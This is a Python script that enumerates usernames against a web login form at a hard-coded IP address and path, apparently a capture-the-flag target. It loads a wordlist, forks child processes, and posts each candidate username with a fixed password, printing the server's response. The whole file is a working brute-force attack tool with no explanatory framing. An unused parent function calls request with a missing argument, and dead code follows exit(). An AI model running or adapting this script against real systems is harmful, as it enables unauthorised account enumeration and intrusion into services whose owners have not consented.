import requests
from bs4 import BeautifulSoup
import time
import os

def test_url(url):
    r = requests.get(url)
    if r.status_code == 404:
        print('Code: {}'.format(r.status_code))
        exit()
    return 'Connection OK'

def request(name, password, url):

    payload = {'username' : name, 'password' : password}
    r = requests.post(url, payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    page = soup.find('p').getText()
    return page

def load():
    try:
        with open('wordlist.txt', 'r') as wl:
            wl = wl.readlines()
            wl = list(map(lambda x: x.replace('\n',''), wl))
            #Split in small groups
            size = int(len(wl)/1000)+1
            chunks = [wl[x:x+size] for x in range(0, len(wl), size)]
            return chunks
    except FileNotFoundError:
        print('File not found')
        exit()

def loop():
    code = '709156911b'
    url = 'http://35.190.155.168/'+code+'/login'
    password = 'pass'
    lista = load()
    count = len(lista)
    test_url(url)
    while 1:
        pid = os.fork()
        if pid == 0:

            child(lista[count-1], password, url)
        if count==1:
            os.waitpid(pid,0)
        count-=1
        if count==0:
            break
    exit()

def parent(users, password):
    for username in users:
        out = request(username, password)
        print('{}\t\t\t{}:{}'.format(out, username, password))

def child(users, password, url):
    print('Created child', os.getpid())
    for username in users:
        out = request(username, password, url)
        print('{}\t\t\t{}:{}'.format(out, username, password))
    exit()

if __name__ == '__main__':
    loop()
    exit()

    out = request(username, password)
    print(out)
    #r = requests.post(url, payload)
    #print(output.text)
    #if 'Invalid' in output.text:
    #    print('Invalido')
